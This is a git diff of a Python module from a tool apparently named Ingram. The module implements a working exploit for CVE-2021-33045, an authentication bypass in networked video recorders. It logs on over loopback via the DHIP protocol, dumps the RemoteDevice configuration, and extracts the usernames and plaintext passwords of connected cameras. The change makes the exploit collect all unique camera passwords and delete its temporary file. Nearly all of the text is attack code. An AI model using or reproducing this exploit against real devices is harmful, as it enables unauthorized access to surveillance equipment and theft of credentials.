stash

+++ Ingram/VDB/CVE_2021_33045.py
@@ -7,6 +7,7 @@ import json
 
 from Ingram.utils import config
 from Ingram.utils import logger
+from Ingram.utils import run_cmd
 
 
 def cve_2021_33045(ip: str) -> list:
@@ -18,12 +19,19 @@ def cve_2021_33045(ip: str) -> list:
     json_file = os.path.join(OUT, f"{ip}-{port}-users.json")
 
     try:
-        with os.popen(f"""
+        # with os.popen(f"""
+        # (
+        #     echo "config RemoteDevice save {json_file}"
+        #     echo "quit all"
+        # ) | python -Bu {console} --logon loopback --rhost {ip} --rport {port} --proto dhip 2>/dev/null
+        # """) as f: items = f.readlines()
+        cmd = f"""
         (
             echo "config RemoteDevice save {json_file}"
             echo "quit all"
         ) | python -Bu {console} --logon loopback --rhost {ip} --rport {port} --proto dhip 2>/dev/null
-        """) as f: items = f.readlines()
+        """
+        code, msg = run_cmd(cmd)
 
         # success
         if os.path.exists(json_file):
@@ -32,9 +40,13 @@ def cve_2021_33045(ip: str) -> list:
             dev_all = info['params']['table'].values()
             dev_alive = [i for i in dev_all if i['Enable']]
             user = dev_alive[0]['UserName']
-            passwd = dev_alive[0]['Password']
-            os.remove(json_file)
-            return [True, user, passwd, 'cve-2021-33045', len(dev_alive)]
+            passwds = [i['Password'] for i in dev_alive if i['Password'] != '']
+            passwds = list(set(passwds))
+            # 子相机上有许多不同的密码，但是这些可能都和这台nvr的密码不一样
+            return [True, user, passwds[0], 'cve-2021-33045', len(dev_alive), passwds]
     except Exception as e:
         logger.error(e)
+    finally:
+        if os.path.exists(json_file):
+            os.remove(json_file)
     return [False, ]
